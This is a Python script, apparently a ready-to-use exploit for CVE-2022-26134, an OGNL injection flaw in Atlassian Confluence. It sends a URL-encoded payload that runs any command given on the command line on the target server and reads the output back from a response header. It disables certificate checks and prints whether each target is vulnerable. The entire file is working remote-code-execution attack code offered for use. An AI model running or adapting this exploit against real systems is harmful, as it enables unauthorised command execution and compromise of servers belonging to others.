import argparse
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url, cmd):
    full_url = f"{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    cookies = {"JSESSIONID": "DA45909165A17422FFB5275EEA52065C"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document",
               "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
    try:
        print(full_url)
        response = requests.post(full_url, headers=headers, cookies=cookies, allow_redirects=False, verify=False,
                                 timeout=5)
        if response.status_code == 302 and "X-Cmd-Response" in response.headers:
            print(f'[+]{url}存在CVE-2022-26134漏洞', f"result:{response.headers['X-Cmd-Response']}")
        else:
            print(f'[-]{url}不存在CVE-2022-26134漏洞')
    except Exception:
        print(f'[-]{url}请求连接超时')


if __name__ == '__main__':
    banner = """ 
    _____________   _______________         _______________   ________ ________           ________  ____________________     _____  
    \_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \\_____  \          \_____  \/  _____/_   \_____  \   /  |  | 
    /    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/ /  ____/   ______  /  ____/   __  \ |   | _(__  <  /   |  |_
    \     \____\     /   |        \ /_____/ /       \  \_/   \/       \/       \  /_____/ /       \  |__\  \|   |/       \/    ^   /
     \______  / \___/   /_______  /         \_______ \_____  /\_______ \_______ \         \_______ \_____  /|___/______  /\____   | 
            \/                  \/                  \/     \/         \/       \/                 \/     \/            \/      |__|  
        version:0.0.01
        author:wang
    """
    print(banner)
    parser = argparse.ArgumentParser(description='CVE-2022-26134 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            CVE-2022-26134.py -u http://192.168.1.108 -c id
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, default="whoami", help="default=whoami example: id")
    args = parser.parse_args()

    main(args.url, args.cmd)
